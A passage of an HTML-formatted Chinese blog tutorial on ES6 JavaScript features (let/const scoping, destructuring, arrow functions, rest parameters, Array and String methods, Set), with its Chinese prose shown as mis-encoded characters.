class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    div.innerHTML = text.value.replace(<span class="regexp">/red|blue/g</span>, <span class="string">&#x27;**&#x27;</span>); <span class="comment">// æŠŠ red blue æ›¿æ¢æˆ**</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h1><p>ES çš„å…¨ç§°æ˜¯ ECMAScript , å®ƒæ˜¯ç”± ECMA å›½é™…æ ‡å‡†åŒ–ç»„ç»‡,åˆ¶å®šçš„<strong>ä¸€é¡¹è„šæœ¬è¯­è¨€çš„æ ‡å‡†åŒ–è§„èŒƒ</strong>ã€‚</p><h2 id="let"><a href="#let" class="headerlink" title="let"></a><strong>let</strong></h2><p><strong>letå£°æ˜çš„å˜é‡åªåœ¨æ‰€å¤„äºçš„å—çº§æœ‰æ•ˆ</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123; </span><br><span class="line">     <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// a is not defined</span></span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šä½¿ç”¨letå…³é”®å­—å£°æ˜çš„å˜é‡æ‰å…·æœ‰å—çº§ä½œç”¨åŸŸï¼Œä½¿ç”¨varå£°æ˜çš„å˜é‡ä¸å…·å¤‡å—çº§ä½œç”¨åŸŸç‰¹æ€§ã€‚</p></blockquote><p><strong>ä¸å­˜åœ¨å˜é‡æå‡</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// a is not defined </span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">20</span>;</span><br></pre></td></tr></table></figure><p><strong>æš‚æ—¶æ€§æ­»åŒº</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123; </span><br><span class="line">    tmp = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> tmp; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>ç»å…¸é¢è¯•é¢˜</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">    arr[i] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">arr[<span class="number">0</span>]();</span><br><span class="line">arr[<span class="number">1</span>]();</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/07/HJeYAPzISwTdM67.jpg" alt="Snipaste_2021-06-07_15-34-38.jpg"></p><p><strong>å›¾è§£ï¼š</strong>æ­¤é¢˜çš„å…³é”®ç‚¹åœ¨äºæ¯æ¬¡å¾ªç¯éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªå—çº§ä½œç”¨åŸŸï¼Œæ¯ä¸ªå—çº§ä½œç”¨åŸŸä¸­çš„å˜é‡éƒ½æ˜¯ä¸åŒçš„ï¼Œå‡½æ•°æ‰§è¡Œæ—¶è¾“å‡ºçš„æ˜¯è‡ªå·±ä¸Šä¸€çº§ï¼ˆå¾ªç¯äº§ç”Ÿçš„å—çº§ä½œç”¨åŸŸï¼‰ä½œç”¨åŸŸä¸‹çš„iå€¼ã€‚</p><h2 id="const"><a href="#const" class="headerlink" title="const"></a><strong>const</strong></h2><p>ä½œç”¨ï¼šå£°æ˜å¸¸é‡ï¼Œå¸¸é‡å°±æ˜¯å€¼ï¼ˆå†…å­˜åœ°å€ï¼‰ä¸èƒ½å˜åŒ–çš„é‡ã€‚</p><p><strong>å…·æœ‰å—çº§ä½œç”¨åŸŸ</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123; </span><br><span class="line">    <span class="keyword">const</span> a = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// a is not defined</span></span><br></pre></td></tr></table></figure><p><strong>å£°æ˜å¸¸é‡æ—¶å¿…é¡»èµ‹å€¼</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PI; <span class="comment">// Missing initializer in const declaration</span></span><br><span class="line"><span class="keyword">const</span> PI = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure><p><strong>å¸¸é‡èµ‹å€¼åï¼Œå€¼ä¸èƒ½ä¿®æ”¹ã€‚</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PI = <span class="number">3.14</span>;</span><br><span class="line">PI = <span class="number">100</span>; <span class="comment">// Assignment to constant variable. </span></span><br><span class="line"><span class="keyword">const</span> ary = [<span class="number">100</span>, <span class="number">200</span>];</span><br><span class="line">ary[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>; ary[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(ary); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;]; </span></span><br><span class="line">ary = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]; <span class="comment">// Assignment to constant variable.</span></span><br></pre></td></tr></table></figure><h2 id="letã€constã€var-çš„åŒºåˆ«"><a href="#letã€constã€var-çš„åŒºåˆ«" class="headerlink" title="letã€constã€var çš„åŒºåˆ«"></a><strong>let</strong>ã€<strong><strong>const</strong></strong>ã€var <strong>çš„åŒºåˆ«</strong></h2><ol><li>ä½¿ç”¨ var å£°æ˜çš„å˜é‡ï¼Œå…¶ä½œç”¨åŸŸä¸ºè¯¥è¯­å¥æ‰€åœ¨çš„å‡½æ•°å†…ï¼Œä¸”å­˜åœ¨å˜é‡æå‡ç°è±¡ã€‚</li><li>ä½¿ç”¨ let å£°æ˜çš„å˜é‡ï¼Œå…¶ä½œç”¨åŸŸä¸ºè¯¥è¯­å¥æ‰€åœ¨çš„ä»£ç å—å†…ï¼Œä¸å­˜åœ¨å˜é‡æå‡ã€‚</li><li>ä½¿ç”¨ const å£°æ˜çš„æ˜¯å¸¸é‡ï¼Œåœ¨åé¢å‡ºç°çš„ä»£ç ä¸­ä¸èƒ½å†ä¿®æ”¹è¯¥å¸¸é‡çš„å€¼ã€‚</li></ol><p><img src="https://i.loli.net/2021/06/07/a1g5iulkjcfoNPM.jpg" alt="Snipaste_2021-06-07_15-38-24.jpg"></p><h2 id="è§£æ„èµ‹å€¼"><a href="#è§£æ„èµ‹å€¼" class="headerlink" title="è§£æ„èµ‹å€¼"></a><strong>è§£</strong>æ„èµ‹å€¼</h2><p>ES6ä¸­å…è®¸ä»æ•°ç»„ä¸­æå–å€¼ï¼ŒæŒ‰ç…§å¯¹åº”ä½ç½®ï¼Œå¯¹å˜é‡èµ‹å€¼ã€‚å¯¹è±¡ä¹Ÿå¯ä»¥å®ç°è§£æ„ã€‚</p><h3 id="æ•°ç»„è§£æ„"><a href="#æ•°ç»„è§£æ„" class="headerlink" title="æ•°ç»„è§£æ„"></a><strong>æ•°ç»„è§£æ„</strong></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ•°ç»„è§£æ„å…è®¸æˆ‘ä»¬æŒ‰ç…§ä¸€ä¸€å¯¹åº”çš„å…³ç³»ä»æ•°ç»„ä¸­æå–å€¼ ç„¶åå°†å€¼èµ‹å€¼ç»™å˜é‡</span></span><br><span class="line"><span class="keyword">let</span> ary = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> [a, b, c, d, e] = ary;</span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(b) <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(c) <span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log(d) <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(e) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h3 id="å¯¹è±¡è§£æ„"><a href="#å¯¹è±¡è§£æ„" class="headerlink" title="å¯¹è±¡è§£æ„"></a><strong>å¯¹è±¡</strong>è§£æ„</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¯¹è±¡è§£æ„å…è®¸æˆ‘ä»¬ä½¿ç”¨å˜é‡çš„åå­—åŒ¹é…å¯¹è±¡çš„å±æ€§ åŒ¹é…æˆåŠŸ å°†å¯¹è±¡å±æ€§çš„å€¼èµ‹å€¼ç»™å˜é‡</span></span><br><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">name</span>: <span class="string">&#x27;lisi&#x27;</span>, <span class="attr">age</span>: <span class="number">30</span>, <span class="attr">sex</span>: <span class="string">&#x27;ç”·&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; name, age, sex &#125; = person;</span><br><span class="line"><span class="built_in">console</span>.log(name) <span class="comment">// lisi</span></span><br><span class="line"><span class="built_in">console</span>.log(age)  <span class="comment">// 30</span></span><br><span class="line"><span class="built_in">console</span>.log(sex)  <span class="comment">// ç”·</span></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">name</span>: myName&#125; = person; <span class="comment">// myName å±äºåˆ«å</span></span><br><span class="line"><span class="built_in">console</span>.log(myName) <span class="comment">// lisi</span></span><br></pre></td></tr></table></figure><h2 id="ç®­å¤´å‡½æ•°"><a href="#ç®­å¤´å‡½æ•°" class="headerlink" title="ç®­å¤´å‡½æ•°"></a><strong>ç®­å¤´å‡½æ•°</strong></h2><p>ES6ä¸­æ–°å¢çš„å®šä¹‰å‡½æ•°çš„æ–¹å¼ã€‚</p><h3 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h3><p>ç®­å¤´å‡½æ•°æ˜¯ç”¨æ¥ç®€åŒ–å‡½æ•°å®šä¹‰è¯­æ³•çš„</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fn = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">123</span>)</span><br><span class="line">&#125;</span><br><span class="line">fn();</span><br></pre></td></tr></table></figure><p>åœ¨ç®­å¤´å‡½æ•°ä¸­ï¼Œå¦‚æœå‡½æ•°ä½“ä¸­åªæœ‰ä¸€å¥ä»£ç ï¼Œä¸”ä»£ç çš„æ‰§è¡Œç»“æœå°±æ˜¯è¿”å›å€¼ï¼Œå¯ä»¥çœç•¥å¤§æ‹¬å·</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sum = <span class="function">(<span class="params">n1, n2</span>) =&gt;</span> n1 + n2; </span><br><span class="line"><span class="keyword">const</span> result = sum(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">console</span>.log(result)</span><br></pre></td></tr></table></figure><p>åœ¨ç®­å¤´å‡½æ•°ä¸­å¦‚æœå½¢å‚åªæœ‰ä¸€ä¸ªï¼Œå½¢å‚å¤–ä¾§çš„å°æ‹¬å·ä¹Ÿæ˜¯å¯ä»¥çœç•¥çš„</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fn = <span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">alert(v);</span><br><span class="line">&#125;</span><br><span class="line">fn(<span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>ç®­å¤´å‡½æ•°è‹¥ä¸ç»‘å®š this ï¼Œåˆ™ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„ this å…³é”®å­—ã€‚thiså…³é”®å­—å°†æŒ‡å‘<strong>ç®­å¤´å‡½æ•°å®šä¹‰ä½ç½®</strong>ä¸­çš„ä¸Šä¸‹æ–‡thisï¼ˆä¸€èˆ¬ window ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>); <span class="comment">// window</span></span><br><span class="line"><span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> obj = &#123;<span class="attr">name</span>: <span class="string">&#x27;zhangsan&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> resFn = fn.call(obj);</span><br><span class="line">resFn(); <span class="comment">// zhangsan</span></span><br></pre></td></tr></table></figure><h3 id="é¢è¯•é¢˜"><a href="#é¢è¯•é¢˜" class="headerlink" title="é¢è¯•é¢˜"></a>é¢è¯•é¢˜</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> age = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line"><span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line"><span class="attr">say</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">alert(<span class="built_in">this</span>.age)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.say(); <span class="comment">// 100</span></span><br></pre></td></tr></table></figure><h2 id="å‰©ä½™å‚æ•°"><a href="#å‰©ä½™å‚æ•°" class="headerlink" title="å‰©ä½™å‚æ•°"></a><strong>å‰©ä½™å‚æ•°</strong></h2><p>å‰©ä½™å‚æ•°è¯­æ³•å…è®¸æˆ‘ä»¬å°†ä¸€ä¸ªä¸å®šæ•°é‡çš„å‚æ•°è¡¨ç¤ºä¸ºä¸€ä¸ªæ•°ç»„ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span> (<span class="params">first, ...args</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(first); <span class="comment">// 10</span></span><br><span class="line">    <span class="built_in">console</span>.log(args); <span class="comment">// [20, 30] </span></span><br><span class="line">&#125;</span><br><span class="line">sum(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>å‰©ä½™å‚æ•°å’Œè§£æ„é…åˆä½¿ç”¨</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> students = [<span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;lisi&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> [s1, ...s2] = students; </span><br><span class="line"><span class="built_in">console</span>.log(s1);  <span class="comment">// &#x27;wangwu&#x27; </span></span><br><span class="line"><span class="built_in">console</span>.log(s2);  <span class="comment">// [&#x27;zhangsan&#x27;, &#x27;lisi&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="Array-çš„æ‰©å±•æ–¹æ³•"><a href="#Array-çš„æ‰©å±•æ–¹æ³•" class="headerlink" title="Array çš„æ‰©å±•æ–¹æ³•"></a><strong>Array</strong> <strong>çš„æ‰©å±•æ–¹æ³•</strong></h2><h3 id="æ‰©å±•è¿ç®—ç¬¦ï¼ˆå±•å¼€è¯­æ³•"><a href="#æ‰©å±•è¿ç®—ç¬¦ï¼ˆå±•å¼€è¯­æ³•" class="headerlink" title="æ‰©å±•è¿ç®—ç¬¦ï¼ˆå±•å¼€è¯­æ³•)"></a><strong>æ‰©å±•è¿ç®—ç¬¦ï¼ˆå±•å¼€è¯­æ³•)</strong></h3><p>æ‰©å±•è¿ç®—ç¬¦å¯ä»¥å°†æ•°ç»„æˆ–è€…å¯¹è±¡è½¬ä¸ºç”¨é€—å·åˆ†éš”çš„å‚æ•°åºåˆ—ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ary = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">...ary  <span class="comment">// 1, 2, 3</span></span><br><span class="line"><span class="built_in">console</span>.log(...ary);    <span class="comment">// 1 2 3</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>æ‰©å±•è¿ç®—ç¬¦å¯ä»¥åº”ç”¨äºåˆå¹¶æ•°ç»„ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•ä¸€ </span></span><br><span class="line"> <span class="keyword">let</span> ary1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; <span class="keyword">let</span> ary2 = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"> <span class="keyword">let</span> ary3 = [...ary1, ...ary2];</span><br><span class="line"> <span class="comment">// æ–¹æ³•äºŒ </span></span><br><span class="line"> ary1.push(...ary2);</span><br></pre></td></tr></table></figure><p>å°†ç±»æ•°ç»„æˆ–å¯éå†å¯¹è±¡è½¬æ¢ä¸ºçœŸæ­£çš„æ•°ç»„</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> oDivs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;div&#x27;</span>); </span><br><span class="line">oDivs = [...oDivs];</span><br></pre></td></tr></table></figure><h3 id="æ„é€ å‡½æ•°æ–¹æ³•ï¼šArray-from"><a href="#æ„é€ å‡½æ•°æ–¹æ³•ï¼šArray-from" class="headerlink" title="æ„é€ å‡½æ•°æ–¹æ³•ï¼šArray.from()"></a><strong>æ„é€ å‡½æ•°æ–¹æ³•ï¼š</strong>Array.from()</h3><p>å°†ç±»æ•°ç»„æˆ–å¯éå†å¯¹è±¡è½¬æ¢ä¸ºçœŸæ­£çš„æ•°ç»„</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="attr">length</span>: <span class="number">3</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="built_in">Array</span>.from(arrayLike); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure><p>æ–¹æ³•è¿˜å¯ä»¥æ¥å—ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½œç”¨ç±»ä¼¼äºæ•°ç»„çš„mapæ–¹æ³•ï¼Œç”¨æ¥å¯¹æ¯ä¸ªå…ƒç´ è¿›è¡Œå¤„ç†ï¼Œå°†å¤„ç†åçš„å€¼æ”¾å…¥è¿”å›çš„æ•°ç»„ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123; </span><br><span class="line">    <span class="string">&quot;0&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;length&quot;</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> newAry = <span class="built_in">Array</span>.from(aryLike, <span class="function"><span class="params">item</span> =&gt;</span> item *<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="å®ä¾‹æ–¹æ³•ï¼šfind"><a href="#å®ä¾‹æ–¹æ³•ï¼šfind" class="headerlink" title="å®ä¾‹æ–¹æ³•ï¼šfind()"></a><strong>å®ä¾‹æ–¹æ³•ï¼š</strong>find()</h3><p>ç”¨äºæ‰¾å‡ºç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„æ•°ç»„æˆå‘˜ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°è¿”å›undefined</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ary = [&#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;å¼ ä¸‰â€˜</span></span><br><span class="line"><span class="string">&#125;, &#123; </span></span><br><span class="line"><span class="string">    id: 2,</span></span><br><span class="line"><span class="string">    name: &#x27;</span>æå››â€˜</span><br><span class="line">&#125;]; </span><br><span class="line"><span class="keyword">let</span> target = ary.find(<span class="function">(<span class="params">item, index</span>) =&gt;</span> item.id == <span class="number">2</span>);</span><br></pre></td></tr></table></figure><h3 id="å®ä¾‹æ–¹æ³•ï¼šfindIndex"><a href="#å®ä¾‹æ–¹æ³•ï¼šfindIndex" class="headerlink" title="å®ä¾‹æ–¹æ³•ï¼šfindIndex()"></a><strong>å®ä¾‹æ–¹æ³•ï¼š</strong>findIndex()</h3><p>ç”¨äºæ‰¾å‡ºç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„æ•°ç»„æˆå‘˜çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°è¿”å›-1</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ary = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>];</span><br><span class="line"><span class="keyword">let</span> index = ary.findIndex(<span class="function">(<span class="params">value, index</span>) =&gt;</span> value &gt; <span class="number">9</span>); </span><br><span class="line"><span class="built_in">console</span>.log(index); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h3 id="å®ä¾‹æ–¹æ³•ï¼šincludes"><a href="#å®ä¾‹æ–¹æ³•ï¼šincludes" class="headerlink" title="å®ä¾‹æ–¹æ³•ï¼šincludes()"></a><strong>å®ä¾‹æ–¹æ³•ï¼š</strong>includes()</h3><p>è¡¨ç¤ºæŸä¸ªæ•°ç»„æ˜¯å¦åŒ…å«ç»™å®šçš„å€¼ï¼Œè¿”å›å¸ƒå°”å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>) <span class="comment">// true </span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">4</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h2 id="String-çš„æ‰©å±•æ–¹æ³•"><a href="#String-çš„æ‰©å±•æ–¹æ³•" class="headerlink" title="String çš„æ‰©å±•æ–¹æ³•"></a><strong>String</strong> <strong>çš„æ‰©å±•æ–¹æ³•</strong></h2><h3 id="æ¨¡æ¿å­—ç¬¦ä¸²"><a href="#æ¨¡æ¿å­—ç¬¦ä¸²" class="headerlink" title="æ¨¡æ¿å­—ç¬¦ä¸²"></a><strong>æ¨¡æ¿å­—ç¬¦ä¸²</strong></h3><p>ES6æ–°å¢çš„åˆ›å»ºå­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œä½¿ç”¨åå¼•å·å®šä¹‰ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">`zhangsan`</span>;</span><br></pre></td></tr></table></figure><p>æ¨¡æ¿å­—ç¬¦ä¸²ä¸­å¯ä»¥è§£æå˜é‡ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;å¼ ä¸‰&#x27;</span>; </span><br><span class="line"><span class="keyword">let</span> sayHello = <span class="string">`hello,my name is <span class="subst">$&#123;name&#125;</span>`</span>; <span class="comment">// hello, my name is zhangsan</span></span><br></pre></td></tr></table></figure><p>æ¨¡æ¿å­—ç¬¦ä¸²ä¸­å¯ä»¥æ¢è¡Œ</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> result = &#123; </span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;zhangsan&#x27;</span>, </span><br><span class="line">    <span class="attr">age</span>: <span class="number">20</span>, </span><br><span class="line">    <span class="attr">sex</span>: <span class="string">&#x27;ç”·&#x27;</span> </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">let</span> html = <span class="string">` &lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;span&gt;<span class="subst">$&#123;result.name&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">    &lt;span&gt;<span class="subst">$&#123;result.age&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">    &lt;span&gt;<span class="subst">$&#123;result.sex&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt; `</span>;</span><br></pre></td></tr></table></figure><p>åœ¨æ¨¡æ¿å­—ç¬¦ä¸²ä¸­å¯ä»¥è°ƒç”¨å‡½æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sayHello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; </span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27;å“ˆå“ˆå“ˆå“ˆ è¿½ä¸åˆ°æˆ‘å§ æˆ‘å°±æ˜¯è¿™ä¹ˆå¼ºå¤§&#x27;</span>;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">let</span> greet = <span class="string">`<span class="subst">$&#123;sayHello()&#125;</span> å“ˆå“ˆå“ˆå“ˆ`</span>; </span><br><span class="line"><span class="built_in">console</span>.log(greet); <span class="comment">// å“ˆå“ˆå“ˆå“ˆ è¿½ä¸åˆ°æˆ‘å§ æˆ‘å°±æ˜¯è¿™ä¹ˆå¼ºå¤§ å“ˆå“ˆå“ˆå“ˆ</span></span><br></pre></td></tr></table></figure><h3 id="å®ä¾‹æ–¹æ³•ï¼šstartsWith-å’Œ-endsWith"><a href="#å®ä¾‹æ–¹æ³•ï¼šstartsWith-å’Œ-endsWith" class="headerlink" title="å®ä¾‹æ–¹æ³•ï¼šstartsWith()å’Œ endsWith()"></a><strong>å®ä¾‹æ–¹æ³•ï¼š</strong>startsWith()<strong>å’Œ</strong> <strong>endsWith</strong>()</h3><ul><li>startsWith()ï¼šè¡¨ç¤ºå‚æ•°å­—ç¬¦ä¸²æ˜¯å¦åœ¨åŸå­—ç¬¦ä¸²çš„å¤´éƒ¨ï¼Œè¿”å›å¸ƒå°”å€¼</li><li>endsWith()ï¼šè¡¨ç¤ºå‚æ•°å­—ç¬¦ä¸²æ˜¯å¦åœ¨åŸå­—ç¬¦ä¸²çš„å°¾éƒ¨ï¼Œè¿”å›å¸ƒå°”å€¼</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line">str.startsWith(<span class="string">&#x27;Hello&#x27;</span>) <span class="comment">// true </span></span><br><span class="line">str.endsWith(<span class="string">&#x27;!&#x27;</span>)       <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="å®ä¾‹æ–¹æ³•ï¼šrepeat"><a href="#å®ä¾‹æ–¹æ³•ï¼šrepeat" class="headerlink" title="å®ä¾‹æ–¹æ³•ï¼šrepeat()"></a><strong>å®ä¾‹æ–¹æ³•ï¼š</strong>repeat()</h3><p>repeatæ–¹æ³•è¡¨ç¤ºå°†åŸå­—ç¬¦ä¸²é‡å¤næ¬¡ï¼Œè¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.repeat(<span class="number">3</span>)      <span class="comment">// &quot;xxx&quot; </span></span><br><span class="line"><span class="string">&#x27;hello&#x27;</span>.repeat(<span class="number">2</span>)  <span class="comment">// &quot;hellohello&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Set-æ•°æ®ç»“æ„"><a href="#Set-æ•°æ®ç»“æ„" class="headerlink" title="Set æ•°æ®ç»“æ„"></a><strong>Set</strong> <strong>æ•°æ®ç»“æ„</strong></h2><p>ES6 æä¾›äº†æ–°çš„æ•°æ®ç»“æ„ Setã€‚å®ƒç±»ä¼¼äºæ•°ç»„ï¼Œä½†æ˜¯æˆå‘˜çš„å€¼éƒ½æ˜¯å”¯ä¸€çš„ï¼Œæ²¡æœ‰é‡å¤çš„å€¼ã€‚</p><p>Setæœ¬èº«æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆ Set æ•°æ®ç»“æ„ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br></pre></td></tr></table></figure><p>Setå‡½æ•°å¯ä»¥æ¥å—ä¸€ä¸ªæ•°ç»„ä½œä¸ºå‚æ•°ï¼Œç”¨æ¥åˆå§‹åŒ–ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span 